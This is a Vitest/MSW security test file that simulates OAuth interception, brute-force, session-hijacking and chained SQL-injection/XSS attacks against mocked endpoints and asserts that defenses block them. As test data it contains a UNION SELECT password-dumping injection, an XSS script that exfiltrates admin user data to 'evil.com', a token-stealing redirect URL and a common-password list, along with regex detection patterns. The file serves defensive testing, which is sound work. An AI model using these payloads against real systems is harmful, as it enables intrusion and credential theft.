/**
 * Attack Scenario Simulation Security Tests
 *
 * Comprehensive simulation of real-world attack scenarios to validate
 * security implementation effectiveness against sophisticated threats.
 *
 * Test Coverage:
 * - Authentication attack scenarios and defense mechanisms
 * - API attack vectors and protection layers
 * - Configuration attack scenarios and hardening
 * - Session hijacking and protection mechanisms
 * - Multi-vector attack simulations
 * - Advanced persistent threat (APT) simulations
 */

import { HttpResponse, http } from 'msw'
import { setupServer } from 'msw/node'
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { z } from 'zod'
import { apiTestUtils } from '../api/utils/api-test-utilities'

// Attack simulation schemas
const AttackVectorSchema = z.object({
  attackId: z.string().uuid(),
  vectorType: z.enum([
    'oauth_interception',
    'brute_force',
    'session_hijacking',
    'csrf_attack',
    'sql_injection_chain',
    'xss_payload',
    'parameter_pollution',
    'rate_limit_bypass',
    'configuration_override',
    'credential_stuffing',
    'timing_attack',
    'replay_attack',
  ]),
  severity: z.enum(['low', 'medium', 'high', 'critical']),
  payload: z.record(z.any()),
  expectedDefense: z.string(),
  timestamp: z.string().datetime(),
  sourceIp: z.string().ip(),
  userAgent: z.string(),
})

const AttackDefenseResultSchema = z.object({
  attackId: z.string().uuid(),
  vectorType: z.string(),
  defenseApplied: z.array(z.string()),
  blocked: z.boolean(),
  detectionTime: z.number(),
  responseTime: z.number(),
  securityLevel: z.enum(['none', 'basic', 'advanced', 'enterprise']),
  riskMitigation: z.number().min(0).max(100),
  additionalMeasures: z.array(z.string()),
})

const ThreatIntelligenceSchema = z.object({
  threatId: z.string().uuid(),
  attackPattern: z.string(),
  indicators: z.object({
    ipAddresses: z.array(z.string()),
    userAgents: z.array(z.string()),
    requestPatterns: z.array(z.string()),
    timingSignatures: z.array(z.number()),
  }),
  riskScore: z.number().min(0).max(100),
  countermeasures: z.array(z.string()),
  lastSeen: z.string().datetime(),
})

// Test setup
const server = setupServer()
const performanceTracker = new apiTestUtils.performanceTracker()

beforeAll(() => server.listen({ onUnhandledRequest: 'error' }))
afterEach(() => {
  server.resetHandlers()
  performanceTracker.clear()
})
afterAll(() => server.close())

describe('Attack Scenario Simulation Security Tests', () => {
  let attackLog: z.infer<typeof AttackVectorSchema>[] = []
  let defenseResults: z.infer<typeof AttackDefenseResultSchema>[] = []
  let threatIntelligence: z.infer<typeof ThreatIntelligenceSchema>[] = []
  const rateLimitStore: Map<string, { count: number; timestamps: number[] }> = new Map()

  beforeEach(() => {
    attackLog = []
    defenseResults = []
    threatIntelligence = []
    rateLimitStore.clear()
    vi.clearAllMocks()
  })

  describe('Authentication Attack Scenarios', () => {
    it('should prevent OAuth authorization code interception attacks', async () => {
      const attackId = apiTestUtils.dataGenerator.generateUUID()
      const legitimateState = apiTestUtils.dataGenerator.generateRandomString(32)
      const maliciousState = apiTestUtils.dataGenerator.generateRandomString(32)
      const authCode = 'auth_code_12345'

      // Record attack vector
      const oauthInterceptionAttack: z.infer<typeof AttackVectorSchema> = {
        attackId,
        vectorType: 'oauth_interception',
        severity: 'high',
        payload: {
          interceptedCode: authCode,
          originalState: legitimateState,
          maliciousState: maliciousState,
          redirectAttempt: 'https://evil-site.com/steal-tokens',
        },
        expectedDefense: 'state_validation',
        timestamp: new Date().toISOString(),
        sourceIp: '192.168.1.50', // Suspicious IP
        userAgent: 'AttackBot/1.0',
      }

      attackLog.push(oauthInterceptionAttack)

      server.use(
        http.get('http://localhost:3000/api/auth/callback/github', ({ request }) => {
          const startTime = performance.now()
          const url = new URL(request.url)
          const state = url.searchParams.get('state')
          const code = url.searchParams.get('code')
          const suspiciousIp = request.headers.get('X-Forwarded-For') || '127.0.0.1'

          const defenseStart = performance.now()

          // Defense Layer 1: State parameter validation
          if (state !== legitimateState) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'oauth_interception',
              defenseApplied: ['state_validation'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'advanced',
              riskMitigation: 95,
              additionalMeasures: ['ip_blocking', 'security_audit'],
            }

            defenseResults.push(defenseResult)

            // Update threat intelligence
            const threat: z.infer<typeof ThreatIntelligenceSchema> = {
              threatId: apiTestUtils.dataGenerator.generateUUID(),
              attackPattern: 'oauth_code_interception',
              indicators: {
                ipAddresses: [suspiciousIp],
                userAgents: [oauthInterceptionAttack.userAgent],
                requestPatterns: [`/api/auth/callback/github?state=${state}&code=${code}`],
                timingSignatures: [performance.now() - startTime],
              },
              riskScore: 90,
              countermeasures: ['state_validation', 'ip_geofencing', 'rate_limiting'],
              lastSeen: new Date().toISOString(),
            }

            threatIntelligence.push(threat)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'OAUTH_INTERCEPTION_DETECTED',
                  message: 'OAuth authorization code interception attempt detected',
                  details: {
                    attackId,
                    securityMeasures: defenseResult.defenseApplied,
                    threat: threat.threatId,
                  },
                },
              },
              { status: 403 }
            )
          }

          // Defense Layer 2: Code freshness validation
          const codeAge = Date.now() - (Date.now() - 30000) // Simulate 30 second old code
          if (codeAge > 30000) {
            // Codes expire after 30 seconds
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'oauth_interception',
              defenseApplied: ['code_expiration'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'basic',
              riskMitigation: 80,
              additionalMeasures: ['code_regeneration'],
            }

            defenseResults.push(defenseResult)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'AUTHORIZATION_CODE_EXPIRED',
                  message: 'Authorization code has expired',
                },
              },
              { status: 400 }
            )
          }

          // Defense Layer 3: IP geolocation validation
          const suspiciousIpPatterns = ['192.168.1.50', '10.0.0.1'] // Known attack IPs
          if (suspiciousIpPatterns.includes(suspiciousIp)) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'oauth_interception',
              defenseApplied: ['ip_geofencing', 'threat_intelligence'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'enterprise',
              riskMitigation: 98,
              additionalMeasures: ['threat_hunting', 'incident_response'],
            }

            defenseResults.push(defenseResult)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'SUSPICIOUS_IP_BLOCKED',
                  message: 'Request from suspicious IP address blocked',
                },
              },
              { status: 403 }
            )
          }

          return HttpResponse.json({
            success: true,
            data: { message: 'OAuth callback processed successfully' },
          })
        })
      )

      // Simulate legitimate OAuth callback
      const legitimateResponse = await fetch(
        `http://localhost:3000/api/auth/callback/github?state=${legitimateState}&code=${authCode}`
      )
      expect(legitimateResponse.status).toBe(200)

      // Simulate attack with invalid state
      const attackResponse = await fetch(
        `http://localhost:3000/api/auth/callback/github?state=${maliciousState}&code=${authCode}`,
        {
          headers: {
            'X-Forwarded-For': '192.168.1.50',
            'User-Agent': 'AttackBot/1.0',
          },
        }
      )

      expect(attackResponse.status).toBe(403)
      const attackData = await attackResponse.json()
      expect(attackData.error.code).toBe('OAUTH_INTERCEPTION_DETECTED')

      // Verify defense effectiveness
      const stateValidationDefenses = defenseResults.filter(r =>
        r.defenseApplied.includes('state_validation')
      )
      expect(stateValidationDefenses).toHaveLength(1)
      expect(stateValidationDefenses[0].blocked).toBe(true)
      expect(stateValidationDefenses[0].riskMitigation).toBeGreaterThanOrEqual(95)

      // Verify threat intelligence collection
      expect(threatIntelligence).toHaveLength(1)
      expect(threatIntelligence[0].attackPattern).toBe('oauth_code_interception')
      expect(threatIntelligence[0].riskScore).toBe(90)
    })

    it('should block sophisticated brute force authentication attacks', async () => {
      const attackId = apiTestUtils.dataGenerator.generateUUID()
      const targetEmail = 'admin@contribux.com'
      const attackerIp = '192.168.1.100'

      const bruteForceAttack: z.infer<typeof AttackVectorSchema> = {
        attackId,
        vectorType: 'brute_force',
        severity: 'critical',
        payload: {
          targetEmail,
          passwordAttempts: [
            'password123',
            'admin123',
            '123456',
            'password',
            'qwerty',
            'letmein',
            'welcome',
            'monkey',
            '123456789',
            'football',
          ],
          rotatingUserAgents: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64)',
          ],
          timingVariation: true,
        },
        expectedDefense: 'rate_limiting_progressive',
        timestamp: new Date().toISOString(),
        sourceIp: attackerIp,
        userAgent: 'BruteForceBot/2.0',
      }

      attackLog.push(bruteForceAttack)

      server.use(
        http.post('http://localhost:3000/api/auth/signin', async ({ request }) => {
          const startTime = performance.now()
          const body = await request.json()
          const { email, password } = body
          const clientIp = request.headers.get('X-Forwarded-For') || '127.0.0.1'
          const userAgent = request.headers.get('User-Agent') || 'unknown'

          // Initialize rate limiting data
          if (!rateLimitStore.has(clientIp)) {
            rateLimitStore.set(clientIp, { count: 0, timestamps: [] })
          }

          const clientData = rateLimitStore.get(clientIp)!
          const now = Date.now()
          const windowSize = 60000 // 1 minute window

          // Clean old timestamps
          clientData.timestamps = clientData.timestamps.filter(ts => now - ts < windowSize)
          clientData.count = clientData.timestamps.length

          const defenseStart = performance.now()

          // Defense Layer 1: Progressive rate limiting
          let rateLimitThreshold = 3 // Base threshold
          if (clientData.count >= 5)
            rateLimitThreshold = 1 // Very strict after 5 attempts
          else if (clientData.count >= 3) rateLimitThreshold = 2 // Strict after 3 attempts

          if (clientData.timestamps.length >= rateLimitThreshold) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'brute_force',
              defenseApplied: ['progressive_rate_limiting'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'advanced',
              riskMitigation: 85,
              additionalMeasures: ['account_lockout', 'captcha_challenge'],
            }

            defenseResults.push(defenseResult)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'RATE_LIMIT_EXCEEDED',
                  message: 'Too many authentication attempts',
                  details: {
                    retryAfter: Math.ceil(
                      (60000 - (now - Math.min(...clientData.timestamps))) / 1000
                    ),
                    attemptsRemaining: 0,
                  },
                },
              },
              { status: 429 }
            )
          }

          // Defense Layer 2: Pattern detection
          const isCommonPassword = [
            'password123',
            'admin123',
            '123456',
            'password',
            'qwerty',
          ].includes(password)

          const isSuspiciousAgent = userAgent.includes('Bot') || userAgent.includes('Attack')

          if (isCommonPassword && clientData.count >= 2) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'brute_force',
              defenseApplied: ['pattern_detection', 'password_intelligence'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'enterprise',
              riskMitigation: 95,
              additionalMeasures: ['threat_intelligence_update', 'honeypot_deployment'],
            }

            defenseResults.push(defenseResult)

            // Update threat intelligence
            const threat: z.infer<typeof ThreatIntelligenceSchema> = {
              threatId: apiTestUtils.dataGenerator.generateUUID(),
              attackPattern: 'dictionary_attack',
              indicators: {
                ipAddresses: [clientIp],
                userAgents: [userAgent],
                requestPatterns: ['POST /api/auth/signin with common passwords'],
                timingSignatures: clientData.timestamps
                  .slice(-5)
                  .map((ts, i, arr) => (i > 0 ? ts - arr[i - 1] : 0))
                  .filter(diff => diff > 0),
              },
              riskScore: 95,
              countermeasures: ['progressive_delays', 'account_monitoring', 'ip_blocking'],
              lastSeen: new Date().toISOString(),
            }

            threatIntelligence.push(threat)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'BRUTE_FORCE_DETECTED',
                  message: 'Brute force attack detected',
                  details: {
                    threatLevel: 'high',
                    accountProtected: true,
                  },
                },
              },
              { status: 403 }
            )
          }

          // Defense Layer 3: User agent analysis
          if (isSuspiciousAgent) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'brute_force',
              defenseApplied: ['user_agent_filtering'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'basic',
              riskMitigation: 70,
              additionalMeasures: ['user_agent_blacklist'],
            }

            defenseResults.push(defenseResult)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'SUSPICIOUS_CLIENT',
                  message: 'Suspicious client detected',
                },
              },
              { status: 403 }
            )
          }

          // Record failed attempt
          clientData.timestamps.push(now)
          clientData.count++

          // Simulate authentication failure (all passwords are wrong for this test)
          return HttpResponse.json(
            {
              success: false,
              error: {
                code: 'INVALID_CREDENTIALS',
                message: 'Invalid email or password',
              },
            },
            { status: 401 }
          )
        })
      )

      // Simulate brute force attack
      const passwords = bruteForceAttack.payload.passwordAttempts
      const responses: Response[] = []

      for (let i = 0; i < passwords.length; i++) {
        const response = await fetch('http://localhost:3000/api/auth/signin', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': attackerIp,
            'User-Agent': i < 3 ? 'BruteForceBot/2.0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          },
          body: JSON.stringify({
            email: targetEmail,
            password: passwords[i],
          }),
        })

        responses.push(response)

        // If rate limited, stop the attack
        if (response.status === 429 || response.status === 403) {
          break
        }

        // Add small delay to simulate human-like behavior
        await new Promise(resolve => setTimeout(resolve, 100))
      }

      // Verify defenses were triggered
      const rateLimitDefenses = defenseResults.filter(r =>
        r.defenseApplied.includes('progressive_rate_limiting')
      )
      const patternDefenses = defenseResults.filter(r =>
        r.defenseApplied.includes('pattern_detection')
      )
      const userAgentDefenses = defenseResults.filter(r =>
        r.defenseApplied.includes('user_agent_filtering')
      )

      expect(
        rateLimitDefenses.length + patternDefenses.length + userAgentDefenses.length
      ).toBeGreaterThan(0)

      // Verify that attack was blocked before all passwords were tried
      const successfulResponses = responses.filter(r => r.status === 200)
      expect(successfulResponses).toHaveLength(0)

      const blockedResponses = responses.filter(r => r.status === 429 || r.status === 403)
      expect(blockedResponses.length).toBeGreaterThan(0)

      // Verify threat intelligence was updated
      expect(threatIntelligence.length).toBeGreaterThan(0)
      const dictionaryAttacks = threatIntelligence.filter(
        t => t.attackPattern === 'dictionary_attack'
      )
      expect(dictionaryAttacks.length).toBeGreaterThan(0)
    })

    it('should detect and prevent session hijacking attempts', async () => {
      const attackId = apiTestUtils.dataGenerator.generateUUID()
      const validSessionId = apiTestUtils.dataGenerator.generateUUID()
      const legitimateIp = '192.168.1.10'
      const attackerIp = '203.0.113.50'
      const legitimateUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      const attackerUserAgent = 'Mozilla/5.0 (Linux; Evil Browser)'

      const sessionHijackingAttack: z.infer<typeof AttackVectorSchema> = {
        attackId,
        vectorType: 'session_hijacking',
        severity: 'high',
        payload: {
          stolenSessionId: validSessionId,
          originalIp: legitimateIp,
          attackerIp: attackerIp,
          sessionReplay: true,
          geolocationSpoof: false,
        },
        expectedDefense: 'session_binding_validation',
        timestamp: new Date().toISOString(),
        sourceIp: attackerIp,
        userAgent: attackerUserAgent,
      }

      attackLog.push(sessionHijackingAttack)

      // Store legitimate session data
      const sessionStore = new Map()
      sessionStore.set(validSessionId, {
        userId: apiTestUtils.dataGenerator.generateUUID(),
        createdAt: Date.now(),
        ipAddress: legitimateIp,
        userAgent: legitimateUserAgent,
        deviceFingerprint: 'fp_legitimate_device',
        lastActivity: Date.now(),
        securityFlags: {
          geoLocationValidated: true,
          deviceConsistent: true,
          behaviourNormal: true,
        },
      })

      server.use(
        http.get('http://localhost:3000/api/user/profile', ({ request }) => {
          const startTime = performance.now()
          const sessionId = request.headers.get('Authorization')?.replace('Bearer ', '')
          const clientIp = request.headers.get('X-Forwarded-For') || '127.0.0.1'
          const userAgent = request.headers.get('User-Agent') || 'unknown'

          if (!sessionId || !sessionStore.has(sessionId)) {
            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'INVALID_SESSION',
                  message: 'Session not found',
                },
              },
              { status: 401 }
            )
          }

          const defenseStart = performance.now()
          const sessionData = sessionStore.get(sessionId)

          // Defense Layer 1: IP address consistency check
          if (sessionData.ipAddress !== clientIp) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'session_hijacking',
              defenseApplied: ['ip_binding_validation'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'advanced',
              riskMitigation: 90,
              additionalMeasures: ['session_invalidation', 'user_notification'],
            }

            defenseResults.push(defenseResult)

            // Invalidate session
            sessionStore.delete(sessionId)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'SESSION_HIJACKING_DETECTED',
                  message: 'Session hijacking attempt detected - IP mismatch',
                  details: {
                    sessionInvalidated: true,
                    originalIp: sessionData.ipAddress,
                    currentIp: clientIp,
                  },
                },
              },
              { status: 403 }
            )
          }

          // Defense Layer 2: User agent consistency check
          if (sessionData.userAgent !== userAgent) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'session_hijacking',
              defenseApplied: ['user_agent_binding'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'advanced',
              riskMitigation: 85,
              additionalMeasures: ['device_verification_challenge'],
            }

            defenseResults.push(defenseResult)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'DEVICE_CHANGE_DETECTED',
                  message: 'Device change detected - additional verification required',
                  details: {
                    challengeRequired: true,
                    originalDevice: sessionData.userAgent,
                    currentDevice: userAgent,
                  },
                },
              },
              { status: 403 }
            )
          }

          // Defense Layer 3: Session age validation
          const sessionAge = Date.now() - sessionData.createdAt
          const maxSessionAge = 24 * 60 * 60 * 1000 // 24 hours

          if (sessionAge > maxSessionAge) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'session_hijacking',
              defenseApplied: ['session_expiration'],
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'basic',
              riskMitigation: 70,
              additionalMeasures: ['reauthentication_required'],
            }

            defenseResults.push(defenseResult)

            sessionStore.delete(sessionId)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'SESSION_EXPIRED',
                  message: 'Session has expired',
                },
              },
              { status: 401 }
            )
          }

          // Update session activity
          sessionData.lastActivity = Date.now()

          return HttpResponse.json({
            success: true,
            data: {
              profile: { id: sessionData.userId, name: 'Test User' },
              sessionValid: true,
            },
          })
        })
      )

      // Test legitimate access
      const legitimateResponse = await fetch('http://localhost:3000/api/user/profile', {
        headers: {
          Authorization: `Bearer ${validSessionId}`,
          'X-Forwarded-For': legitimateIp,
          'User-Agent': legitimateUserAgent,
        },
      })

      expect(legitimateResponse.status).toBe(200)

      // Test session hijacking attempt from different IP
      const hijackResponse = await fetch('http://localhost:3000/api/user/profile', {
        headers: {
          Authorization: `Bearer ${validSessionId}`,
          'X-Forwarded-For': attackerIp,
          'User-Agent': legitimateUserAgent,
        },
      })

      expect(hijackResponse.status).toBe(403)
      const hijackData = await hijackResponse.json()
      expect(hijackData.error.code).toBe('SESSION_HIJACKING_DETECTED')

      // Verify defenses were effective
      const hijackingDefenses = defenseResults.filter(
        r => r.vectorType === 'session_hijacking' && r.blocked
      )
      expect(hijackingDefenses.length).toBeGreaterThan(0)
      expect(hijackingDefenses[0].riskMitigation).toBeGreaterThanOrEqual(85)

      // Verify session was invalidated
      expect(sessionStore.has(validSessionId)).toBe(false)
    })
  })

  describe('Multi-Vector Attack Simulations', () => {
    it('should handle coordinated SQL injection and XSS attack chains', async () => {
      const attackId = apiTestUtils.dataGenerator.generateUUID()

      const multiVectorAttack: z.infer<typeof AttackVectorSchema> = {
        attackId,
        vectorType: 'sql_injection_chain',
        severity: 'critical',
        payload: {
          stage1: {
            type: 'sql_injection',
            payload: "'; UNION SELECT username, password FROM users WHERE admin=1; --",
          },
          stage2: {
            type: 'xss_payload',
            payload:
              '<script>fetch("/api/admin/users").then(r=>r.json()).then(d=>fetch("https://evil.com",{method:"POST",body:JSON.stringify(d)}))</script>',
          },
          stage3: {
            type: 'privilege_escalation',
            payload: 'admin_override=true&user_role=administrator',
          },
        },
        expectedDefense: 'multi_layer_validation',
        timestamp: new Date().toISOString(),
        sourceIp: '203.0.113.100',
        userAgent: 'AdvancedPersistentThreat/1.0',
      }

      attackLog.push(multiVectorAttack)

      server.use(
        http.post('http://localhost:3000/api/search/users', async ({ request }) => {
          const startTime = performance.now()
          const body = await request.json()
          const { query, filters } = body

          const defenseStart = performance.now()
          const defenseResults: string[] = []

          // Defense Layer 1: SQL injection detection
          const sqlPatterns = [
            /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)/i,
            /(--|#|\/\*|\*\/)/,
            /(\bOR\b\s+\b\d+\s*=\s*\d+)/i,
            /(\bUNION\b.*\bSELECT\b)/i,
          ]

          let sqlInjectionDetected = false
          for (const pattern of sqlPatterns) {
            if (pattern.test(query)) {
              sqlInjectionDetected = true
              break
            }
          }

          if (sqlInjectionDetected) {
            defenseResults.push('sql_injection_prevention')
          }

          // Defense Layer 2: XSS detection
          const xssPatterns = [
            /<script[^>]*>.*?<\/script>/gi,
            /<[^>]*on\w+\s*=\s*[^>]*>/gi,
            /javascript:/gi,
            /fetch\s*\(/gi,
          ]

          let xssDetected = false
          const allInputs = [query, ...(filters ? Object.values(filters) : [])].join(' ')
          for (const pattern of xssPatterns) {
            if (pattern.test(allInputs)) {
              xssDetected = true
              break
            }
          }

          if (xssDetected) {
            defenseResults.push('xss_prevention')
          }

          // Defense Layer 3: Privilege escalation detection
          const privilegeEscalationPatterns = [
            /admin_override\s*=\s*true/i,
            /user_role\s*=\s*admin/i,
            /escalate_privileges/i,
          ]

          let privilegeEscalationDetected = false
          for (const pattern of privilegeEscalationPatterns) {
            if (pattern.test(allInputs)) {
              privilegeEscalationDetected = true
              break
            }
          }

          if (privilegeEscalationDetected) {
            defenseResults.push('privilege_escalation_prevention')
          }

          const attackDetected = sqlInjectionDetected || xssDetected || privilegeEscalationDetected

          if (attackDetected) {
            const defenseResult: z.infer<typeof AttackDefenseResultSchema> = {
              attackId,
              vectorType: 'sql_injection_chain',
              defenseApplied: defenseResults,
              blocked: true,
              detectionTime: performance.now() - defenseStart,
              responseTime: performance.now() - startTime,
              securityLevel: 'enterprise',
              riskMitigation: 98,
              additionalMeasures: [
                'threat_intelligence_update',
                'security_team_alert',
                'incident_response_activation',
                'forensic_logging',
              ],
            }

            defenseResults.push(defenseResult)

            // Update threat intelligence with APT indicators
            const threat: z.infer<typeof ThreatIntelligenceSchema> = {
              threatId: apiTestUtils.dataGenerator.generateUUID(),
              attackPattern: 'advanced_persistent_threat',
              indicators: {
                ipAddresses: [multiVectorAttack.sourceIp],
                userAgents: [multiVectorAttack.userAgent],
                requestPatterns: [
                  'SQL injection with UNION SELECT',
                  'XSS with data exfiltration',
                  'Privilege escalation attempt',
                ],
                timingSignatures: [performance.now() - startTime],
              },
              riskScore: 100,
              countermeasures: [
                'immediate_ip_block',
                'enhanced_monitoring',
                'incident_response',
                'threat_hunting',
              ],
              lastSeen: new Date().toISOString(),
            }

            threatIntelligence.push(threat)

            return HttpResponse.json(
              {
                success: false,
                error: {
                  code: 'ADVANCED_THREAT_DETECTED',
                  message: 'Advanced persistent threat detected - multiple attack vectors',
                  details: {
                    threatsDetected: defenseResults,
                    securityLevel: 'maximum',
                    incidentId: threat.threatId,
                  },
                },
              },
              { status: 403 }
            )
          }

          return HttpResponse.json({
            success: true,
            data: { users: [], total_count: 0 },
          })
        })
      )

      // Execute multi-vector attack
      const attackResponse = await fetch('http://localhost:3000/api/search/users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': multiVectorAttack.sourceIp,
          'User-Agent': multiVectorAttack.userAgent,
        },
        body: JSON.stringify({
          query: multiVectorAttack.payload.stage1.payload,
          filters: {
            role: multiVectorAttack.payload.stage3.payload,
            script: multiVectorAttack.payload.stage2.payload,
          },
        }),
      })

      expect(attackResponse.status).toBe(403)
      const attackData = await attackResponse.json()
      expect(attackData.error.code).toBe('ADVANCED_THREAT_DETECTED')

      // Verify all attack vectors were detected
      expect(attackData.error.details.threatsDetected).toContain('sql_injection_prevention')
      expect(attackData.error.details.threatsDetected).toContain('xss_prevention')
      expect(attackData.error.details.threatsDetected).toContain('privilege_escalation_prevention')

      // Verify threat intelligence was updated
      const aptThreats = threatIntelligence.filter(
        t => t.attackPattern === 'advanced_persistent_threat'
      )
      expect(aptThreats).toHaveLength(1)
      expect(aptThreats[0].riskScore).toBe(100)
      expect(aptThreats[0].countermeasures).toContain('incident_response')
    })
  })
})
